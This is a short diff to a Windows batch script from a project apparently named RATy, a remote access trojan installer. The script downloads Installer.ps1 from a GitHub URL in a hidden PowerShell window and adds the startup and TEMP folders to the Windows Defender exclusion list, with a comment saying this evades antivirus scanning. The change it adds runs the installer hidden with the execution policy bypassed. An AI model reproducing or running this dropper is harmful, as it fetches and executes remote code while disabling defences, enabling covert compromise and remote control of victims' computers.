@@ -56,7 +56,8 @@ if not defined STARTUPdir (
 
 @REM RATy resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/Installer.ps1' -OutFile 'installer.ps1' "; Add-MpPreference-ExclusionPath "%STARTUPdir%"; Add-MpPreference-ExclusionPath "$env:temp";  & @REM attempt to exclude STARTUP and TEMP directory from being scanned by AVs
-powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1 & @REM Execution Policy Bypass
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File .\installer.ps1
+@REM powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1 & @REM Execution Policy Bypass
 
 pause
 
